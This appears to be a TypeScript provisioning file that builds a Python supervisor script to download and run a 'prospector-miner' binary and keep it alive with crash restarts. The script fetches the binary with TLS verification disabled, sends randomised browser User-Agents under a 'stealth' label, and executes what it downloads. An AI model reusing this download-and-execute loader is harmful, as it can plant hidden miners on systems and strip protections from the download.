// INICIO DEL ARCHIVO [tools/provisioner/src/lib/payload.ts]
import { config } from '../config';

export function generateMinerPayload(workerId: string): string {
  // Python Supervisor V4: Stealth & Resilience Edition
  return `
import os
import subprocess
import time
import sys
import random
import urllib.request
import ssl

# --- CONFIGURATION ---
BINARY_URL = "${config.MINER_BINARY_URL}"
ORCH_URL = "${config.ORCHESTRATOR_URL}"
TOKEN = "${config.WORKER_AUTH_TOKEN}"
WORKER_ID = "${workerId}"
BIN_NAME = "prospector-miner"

# --- STEALTH UTILS ---
def log(msg):
    print(f"[SUPERVISOR:{WORKER_ID}] {msg}", flush=True)

def get_random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    ]
    return random.choice(agents)

def download_file_stealth(url, filename):
    try:
        log(f"⬇️ Downloading payload from CDN...")

        # Bypass SSL context verify for compatibility
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(
            url,
            data=None,
            headers={
                'User-Agent': get_random_user_agent(),
                'Accept': 'application/octet-stream'
            }
        )

        with urllib.request.urlopen(req, context=ctx, timeout=30) as response, open(filename, 'wb') as out_file:
            data = response.read()
            out_file.write(data)

        os.chmod(filename, 0o755)
        size_mb = os.path.getsize(filename) / (1024 * 1024)
        log(f"✅ Download complete. Size: {size_mb:.2f} MB")
        return True
    except Exception as e:
        log(f"❌ Critical Download Failure: {e}")
        return False

def setup():
    if os.path.exists(BIN_NAME):
        if os.access(BIN_NAME, os.X_OK):
            log("⚡ Binary cached and ready.")
            return

    if not download_file_stealth(BINARY_URL, BIN_NAME):
        log("💀 Aborting: Cannot acquire payload.")
        sys.exit(1)

def loop():
    cmd = [
        f"./{BIN_NAME}",
        f"--orchestrator-url={ORCH_URL}",
        f"--auth-token={TOKEN}",
        f"--worker-id={WORKER_ID}"
    ]

    # Exponential Backoff for resilience
    backoff = 1

    while True:
        log(f"🚀 Igniting Miner Sequence (Backoff: {backoff}s)")
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )

            # Real-time log tunneling
            for line in proc.stdout:
                line = line.strip()
                if line:
                    # Pass-through log from Rust binary
                    print(line, flush=True)

            return_code = proc.wait()

            if return_code == 0:
                log("🏁 Process finished gracefully.")
                break # Exit loop if job done naturally
            else:
                log(f"⚠️ Process crashed (Code: {return_code}). Restarting...")

            time.sleep(backoff)
            backoff = min(backoff * 2, 30) # Cap at 30s

        except Exception as e:
            log(f"💀 Supervisor Exception: {e}")
            time.sleep(10)

if __name__ == "__main__":
    print("--- HYDRA NODE INITIALIZATION ---")
    setup()
    loop()
`;
}
// FIN DEL ARCHIVO
